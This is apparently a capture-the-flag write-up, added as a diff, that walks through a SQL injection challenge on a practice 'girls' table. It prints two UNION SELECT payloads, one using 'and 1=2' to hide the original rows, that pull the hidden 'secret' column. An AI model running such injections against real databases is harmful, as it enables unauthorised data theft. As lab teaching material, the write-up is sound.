@@ -1,0 +1,31 @@
+As always push "Request" button and watch what sort of request is it:
+"Request is: SELECT name FROM girls WHERE id>''"
+
+The Table:
+
+Result:
+---------------------
+id	name	height	secret
+0	Satanichia	0	
+0	Raphiel   	0	
+0	Gabriel   	0	
+0	Vignette	  0
+------------------------------
+
+So in our request we have only id column. 
+But we need secret column. 
+So what we need to do?
+We need to create "glued request".
+
+if you want to do something like this, read about UNION select. 
+
+Lets create request:
+"SELECT name FROM girls WHERE id>'2' union select secret from girls where name = 'Gabriel'"
+This is the simple way to solve this. 
+But i know 1 more way:
+If you dont want to see all other names you should create this request:
+"SELECT name FROM girls WHERE id>'2' and 1=2 union select secret from girls where name = 'Gabriel'"
+
+why did i write 1=2? 
+When creating a request, we indicate that the first half will be incorrect and thats why it cant be outputed.
+----------------------------------------------------------------------------------------------------------------
